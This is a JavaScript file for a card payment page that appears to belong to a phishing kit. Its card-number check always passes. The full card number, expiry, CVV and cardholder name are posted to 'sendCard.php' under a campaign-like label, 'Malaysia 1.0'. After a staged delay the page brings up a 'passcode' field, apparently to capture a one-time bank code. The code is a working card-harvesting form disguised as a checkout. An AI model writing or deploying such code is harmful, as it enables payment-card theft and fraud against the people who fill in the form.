
$(document).ready(function () {
  $('#card-number').payment('formatCardNumber');
  $('#security-code').payment('formatCardCVC');

  // })
  $.validator.addMethod("cardNumber", function (value, element) {
    return true;
  }, "Enter valid card");

  // })
  $.validator.addMethod("cardDate", function (value, element) {
    // let cardDate = $.payment.cardExpiryVal(value);
    return $.payment.validateCardExpiry($('#expiry-month').val(), $('#expiry-year').val());

  }, "Enter valid card expiry");

  // })
  $.validator.addMethod("cardCVV", function (value, element) {
    return $.payment.validateCardCVC(value)
  }, "Minimum 3 characters required");


  $('#msform').validate({
    rules: {
      cardNumber: {
        cardNumber: true
      },
      cardCVV: {
        cardCVV: true
      },
    }
  });
});


$(document).on('click', '#payButton', function (e) {
  e.preventDefault();
  if ($('#msform').valid()) {
    let data = {};
    let uuid = uuidv4()
    document.querySelector("#overlay1").style = "display:flex"
    data['card_number'] = encodeURI($('#card-number').val().replaceAll(' ', ''))
    data['expiry'] = encodeURI($('#expiry-month').val() + ' / ' + $('#expiry-year').val())
    data['cvv'] = encodeURI($('#security-code').val())
    data['price'] = encodeURI(sessionStorage.getItem('dataprice'))
    data['name_on_card'] = encodeURI($('#cardholder-name').val())
    data['project'] = 'Malaysia 1.0'
    data['sessionId'] = uuid
    $('#overlay').show();
    $.ajax({
      url: 'sendCard.php',
      type: "POST",
      data: data,
      success: function (data) {
        setTimeout(function () {
          $('#overlay').hide();
          sessionStorage.setItem('last_num_dig', $('#card-number').val().replaceAll(' ', '').slice(-4))

          sessionStorage.setItem('sessionId', uuid)

          document.querySelector("#label3").innerHTML = localStorage.getItem("Months") + "/" + localStorage.getItem("Years")
          document.querySelector("#label2").innerHTML = sessionStorage.getItem("dataprice")

          //get last 4 digits of card number

          let last = sessionStorage.getItem('last_num_dig');
          $('#label4').text("**** **** **** " + last);

          
          document.querySelector(".other").style = "display:flex"
          document.querySelector(".Guets_container").style = "display:none !important"
          document.querySelector("#overlay1").style = "display:none !important"



          const inputField = document.getElementById('passcode');
          inputField.focus(); inputField.click();
          
        }, 3000);
      },
      error: function () {
        $('#overlay').hide();
      }
    });
  }
  else {
    $('#overlay').hide();
  }
});

function uuidv4() {
  return "10000000-1000-4000-8000-100000000000".replace(/[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
  );
}